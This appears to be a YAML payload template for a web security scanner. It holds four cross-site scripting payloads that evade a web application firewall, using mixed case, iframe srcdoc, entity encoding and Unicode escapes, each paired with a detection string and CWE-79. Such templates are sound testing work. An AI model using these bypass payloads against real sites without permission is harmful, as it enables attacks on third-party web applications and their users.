id: xss-waf-bypass
name: Cross-site scripting — WAF bypasses
context:
  waf_detected: true

payloads:
  - value: "<img src=x oNeRrOr=alert`1`>"
    detect: { body_contains: "oNeRrOr=alert" }
    id: xss-waf-case-01
    title: "XSS — WAF bypass via mixed case + template literals"
    severity: high
    cwe: CWE-79

  - value: "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'>"
    detect: { body_contains: "srcdoc=" }
    id: xss-waf-srcdoc-01
    title: "XSS — WAF bypass via iframe srcdoc"
    severity: high
    cwe: CWE-79

  - value: "<a href=j&#97;v&#97;script:alert(1)>click</a>"
    detect: { body_contains: "&#97;v&#97;script" }
    id: xss-waf-encode-01
    title: "XSS — WAF bypass via HTML entity encoding"
    severity: high
    cwe: CWE-79

  - value: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    detect: { body_contains: "\\u003cscript" }
    id: xss-waf-unicode-01
    title: "XSS — WAF bypass via Unicode escape"
    severity: high
    cwe: CWE-79
